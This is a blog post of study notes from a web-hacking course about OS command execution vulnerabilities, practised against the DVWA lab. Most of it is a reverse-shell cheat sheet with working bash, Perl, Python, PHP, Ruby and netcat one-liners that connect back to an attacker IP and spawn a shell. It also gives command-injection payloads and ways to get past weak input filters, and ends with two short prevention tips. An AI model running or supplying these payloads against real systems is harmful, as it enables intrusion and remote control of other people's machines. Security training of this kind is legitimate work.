---
title: What is Code Execution Vulnerabilities
date: 2017-10-31 12:00:00
tags:
categories: 資訊安全
---
https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/
## Ch 6 : What is Code Execution Vulnerabilities ?
> The 3rd meeting. 
> Lecturer: Tony
* Allows an hacker to execut OS commands.
* Windows or Linux commands.
* Can be get used to reverse shell.
* Or upload any file using wget command.
* Code execution commands attached in the resources.

### Shell examples with different env

> The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.

> Therefore in all f these cases you need to listen for port 8080 using the foolowing command


`Kali linux` Listening on 8080 port
```
nc -vv -l -p 8080
```


---
#### BASH
```
bash -i >& /dev/tcp/10.20.14.208/8080 0>&1
```

#### PERL
```
perl -e 'use Socket;$i="10.20.14.208";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14.208",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP
```
php -r '$sock=fsockopen("10.20.14.208",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.20.14.208",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat
```
nc -e /bin/sh 10.20.14 8080
```
---
### Try yourself
> In this example. we are going to use the Netcat.
> 
Inject the code via input into `Target`.
```
10.20.14.208; pwd
10.20.14.208 | nc -e /bin/sh 10.20.14.208 8080
```

> tips. turn the DVWA security level to `low`
> 

#### Low Security Level
> Simply using `;` to connect the second command. `e.g.` `ls; pwd`.
#### Med Security Level
> It used to be work with `ls ; pwd`. But right now it may prevent the inject by using detect the `;` character. So we change another unix feature called `pipe` with symbol `|`.
#### High Security Level
> View the source code. It check the ip pattern by seperating with `.` into arrarys and allowed only numbers.
### How to prevent the code execution vulnerabilities 
1. Dont use dangerous functions. Such as any of OS functions.
2. Filter user input before execution. e.g. the ip input formate should match the pattern xxx.xxx.xxx.xxx.